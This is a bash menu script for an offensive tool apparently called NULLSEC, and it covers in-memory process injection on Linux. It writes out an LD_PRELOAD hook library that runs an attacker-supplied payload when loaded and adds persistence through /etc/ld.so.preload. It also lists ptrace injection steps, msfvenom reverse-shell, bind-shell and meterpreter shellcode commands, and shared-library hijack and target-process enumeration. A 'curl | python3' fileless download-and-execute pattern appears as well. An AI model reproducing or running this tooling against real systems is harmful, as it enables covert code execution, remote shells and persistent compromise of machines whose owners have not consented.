#!/bin/bash
# NULLSEC Process Injection Module
# In-memory code execution techniques
# bad-antics development


# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
DIM='\033[2m'
RESET='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

clear
echo -e "${RED}"
cat << 'BANNER'
    ██▓███   ██▀███   ▒█████   ▄████▄  ▓█████   ██████   ██████ 
   ▓██░  ██▒▓██ ▒ ██▒▒██▒  ██▒▒██▀ ▀█  ▓█   ▀ ▒██    ▒ ▒██    ▒ 
   ▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒▒▓█    ▄ ▒███   ░ ▓██▄   ░ ▓██▄   
   ▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░▒▓▓▄ ▄██▒▒▓█  ▄   ▒   ██▒  ▒   ██▒
   ▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒ ▓███▀ ░░▒████▒▒██████▒▒▒██████▒▒
      ██▓ ███▄    █  ▄▄▄██▀▀▀▓█████  ▄████▄  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █ 
     ▓██▒ ██ ▀█   █    ▒██   ▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
     ▒██▒▓██  ▀█ ██▒   ░██   ▒███   ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
BANNER
echo -e "${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}          ☠  IN-MEMORY CODE EXECUTION FRAMEWORK  ☠${RESET}"
echo -e "${DIM}              Fileless attack techniques${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

echo -e "${YELLOW}  SELECT INJECTION TECHNIQUE:${RESET}"
echo ""
echo -e "  ${RED}[1]${RESET}  💉 LD_PRELOAD Injection"
echo -e "  ${RED}[2]${RESET}  📝 /proc/PID/mem Injection"
echo -e "  ${RED}[3]${RESET}  🔧 ptrace() Code Injection"
echo -e "  ${RED}[4]${RESET}  🐚 Shellcode Loader"
echo -e "  ${RED}[5]${RESET}  📦 Shared Object Hijacking"
echo -e "  ${RED}[6]${RESET}  🔍 List Target Processes"
echo -e "  ${RED}[7]${RESET}  💀 Memory-Only Payload Delivery"
echo ""
echo -e "  ${GREEN}[Q]${RESET}  Exit"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Select: '${RESET})" choice

case $choice in
    1)
        echo ""
        echo -e "${RED}[*]${RESET} LD_PRELOAD Injection"
        echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Creating malicious shared object..."
        
        cat << 'INJECTOR'
// hook.c - LD_PRELOAD hooking library
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

static void __attribute__((constructor)) init() {
    // Runs when library is loaded
    char *payload = getenv("NULLSEC_PAYLOAD");
    if (payload) {
        system(payload);
    }
}

// Hook execve to intercept all process spawns
int execve(const char *path, char *const argv[], char *const envp[]) {
    static int (*real_execve)(const char *, char *const [], char *const []) = NULL;
    if (!real_execve) {
        real_execve = dlsym(RTLD_NEXT, "execve");
    }
    // Log or modify execution here
    return real_execve(path, argv, envp);
}
INJECTOR

        echo -e "${DIM}"
        cat << 'CODE'
  // hook.c - Sample LD_PRELOAD library
  static void __attribute__((constructor)) init() {
      // Executes when loaded into any process
      system(getenv("NULLSEC_PAYLOAD"));
  }
CODE
        echo -e "${RESET}"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Compile: gcc -shared -fPIC -o hook.so hook.c -ldl"
        echo -e "${YELLOW}[*]${RESET} Usage: LD_PRELOAD=./hook.so /bin/target"
        echo ""
        echo -e "${GREEN}[+]${RESET} Persistence: Add to /etc/ld.so.preload"
        ;;
    
    2)
        echo ""
        echo -e "${RED}[*]${RESET} /proc/PID/mem Direct Memory Write"
        echo ""
        read -p "$(echo -e ${YELLOW}'  [>] Target PID: '${RESET})" TARGET_PID
        
        if [ -d "/proc/$TARGET_PID" ]; then
            echo -e "${GREEN}[+]${RESET} Process found: $(cat /proc/$TARGET_PID/comm 2>/dev/null)"
            echo ""
            echo -e "${YELLOW}[*]${RESET} Process memory maps:"
            head -10 /proc/$TARGET_PID/maps 2>/dev/null
            echo ""
            echo -e "${CYAN}[*]${RESET} Injection points:"
            grep "r-xp" /proc/$TARGET_PID/maps 2>/dev/null | head -5
            echo ""
            echo -e "${DIM}  Requires ptrace permissions to write to /proc/$TARGET_PID/mem${RESET}"
        else
            echo -e "${RED}[!]${RESET} Process $TARGET_PID not found"
        fi
        ;;
    
    3)
        echo ""
        echo -e "${RED}[*]${RESET} ptrace() Code Injection"
        echo ""
        
        cat << 'PTRACE_INFO'
  ptrace() Injection Steps:
  ━━━━━━━━━━━━━━━━━━━━━━━━━━
  1. PTRACE_ATTACH to target process
  2. Wait for process to stop (SIGSTOP)
  3. PTRACE_GETREGS to save registers
  4. Find suitable memory region (RWX or RW)
  5. PTRACE_POKETEXT to write shellcode
  6. Modify RIP/EIP to point to shellcode
  7. PTRACE_SETREGS with modified registers
  8. PTRACE_DETACH to resume execution
PTRACE_INFO
        echo ""
        echo -e "${YELLOW}[*]${RESET} Tools for ptrace injection:"
        echo -e "  ${GREEN}►${RESET} linux-inject (github.com/gaffe23/linux-inject)"
        echo -e "  ${GREEN}►${RESET} Volatility (memory forensics)"
        echo -e "  ${GREEN}►${RESET} Custom C program with ptrace()"
        ;;
    
    4)
        echo ""
        echo -e "${RED}[*]${RESET} Shellcode Loader"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Select payload type:"
        echo -e "  ${RED}[a]${RESET} Reverse Shell"
        echo -e "  ${RED}[b]${RESET} Bind Shell"
        echo -e "  ${RED}[c]${RESET} Meterpreter"
        echo -e "  ${RED}[d]${RESET} Custom shellcode"
        echo ""
        read -p "$(echo -e ${WHITE}'  [>] Select: '${RESET})" payload_type
        
        case $payload_type in
            a)
                read -p "$(echo -e ${YELLOW}'  [>] LHOST: '${RESET})" LHOST
                read -p "$(echo -e ${YELLOW}'  [>] LPORT: '${RESET})" LPORT
                echo ""
                echo -e "${GREEN}[+]${RESET} Generating reverse shell shellcode..."
                echo -e "${DIM}  msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f c${RESET}"
                ;;
            b)
                read -p "$(echo -e ${YELLOW}'  [>] LPORT: '${RESET})" LPORT
                echo ""
                echo -e "${GREEN}[+]${RESET} Generating bind shell shellcode..."
                echo -e "${DIM}  msfvenom -p linux/x64/shell_bind_tcp LPORT=$LPORT -f c${RESET}"
                ;;
            c)
                read -p "$(echo -e ${YELLOW}'  [>] LHOST: '${RESET})" LHOST
                read -p "$(echo -e ${YELLOW}'  [>] LPORT: '${RESET})" LPORT
                echo ""
                echo -e "${GREEN}[+]${RESET} Generating meterpreter shellcode..."
                echo -e "${DIM}  msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f c${RESET}"
                ;;
            d)
                read -p "$(echo -e ${YELLOW}'  [>] Shellcode file: '${RESET})" SC_FILE
                if [ -f "$SC_FILE" ]; then
                    echo -e "${GREEN}[+]${RESET} Shellcode loaded: $(wc -c < "$SC_FILE") bytes"
                fi
                ;;
        esac
        ;;
    
    5)
        echo ""
        echo -e "${RED}[*]${RESET} Shared Object Hijacking"
        echo ""
        read -p "$(echo -e ${YELLOW}'  [>] Target binary: '${RESET})" TARGET_BIN
        
        if [ -f "$TARGET_BIN" ]; then
            echo ""
            echo -e "${YELLOW}[*]${RESET} Analyzing library dependencies..."
            echo ""
            ldd "$TARGET_BIN" 2>/dev/null | head -15
            echo ""
            echo -e "${CYAN}[*]${RESET} Potential hijack locations:"
            echo -e "  ${GREEN}►${RESET} LD_LIBRARY_PATH injection"
            echo -e "  ${GREEN}►${RESET} RPATH/RUNPATH manipulation"
            echo -e "  ${GREEN}►${RESET} Create fake .so in search path"
            echo ""
            
            # Check for missing libraries
            echo -e "${YELLOW}[*]${RESET} Missing libraries (hijackable):"
            ldd "$TARGET_BIN" 2>&1 | grep "not found" | head -5
        else
            echo -e "${RED}[!]${RESET} Binary not found"
        fi
        ;;
    
    6)
        echo ""
        echo -e "${RED}[*]${RESET} Listing Injection Targets"
        echo ""
        echo -e "${YELLOW}[*]${RESET} High-value targets (root processes):"
        ps aux 2>/dev/null | grep -E "^root" | grep -v "\[" | head -10
        echo ""
        echo -e "${YELLOW}[*]${RESET} Processes with network connections:"
        ss -tlnp 2>/dev/null | tail -10
        echo ""
        echo -e "${YELLOW}[*]${RESET} Writable process memory:"
        for pid in $(pgrep -u $(whoami) | head -5); do
            name=$(cat /proc/$pid/comm 2>/dev/null)
            if [ -w "/proc/$pid/mem" ] 2>/dev/null; then
                echo -e "  ${GREEN}►${RESET} PID $pid: $name (writable)"
            fi
        done
        ;;
    
    7)
        echo ""
        echo -e "${RED}[*]${RESET} Memory-Only Payload Delivery"
        echo ""
        echo -e "${YELLOW}[*]${RESET} Techniques for fileless execution:"
        echo ""
        echo -e "  ${MAGENTA}▓▓▓ memfd_create() ▓▓▓${RESET}"
        echo -e "  ${DIM}  Create anonymous file in memory${RESET}"
        echo -e "  ${DIM}  Execute without touching disk${RESET}"
        echo ""
        echo -e "  ${MAGENTA}▓▓▓ shm_open() ▓▓▓${RESET}"
        echo -e "  ${DIM}  Shared memory objects in /dev/shm${RESET}"
        echo -e "  ${DIM}  Execute from RAM-backed filesystem${RESET}"
        echo ""
        echo -e "  ${MAGENTA}▓▓▓ Python/Perl exec ▓▓▓${RESET}"
        echo -e "  ${DIM}  Download and exec in interpreter${RESET}"
        echo -e "  ${DIM}  curl | python3${RESET}"
        echo ""
        echo -e "${GREEN}[+]${RESET} Example: memfd payload execution"
        echo -e "${DIM}  python3 -c 'import ctypes; ...'${RESET}"
        ;;
    
    q|Q) 
        echo -e "\n${RED}[!]${RESET} Exiting Process Injection module\n"
        exit 0 
        ;;
    *) 
        echo -e "\n${RED}[!]${RESET} Invalid option\n" 
        ;;
esac

echo ""
read -p "$(echo -e ${YELLOW}'Press ENTER to continue...'${RESET})"
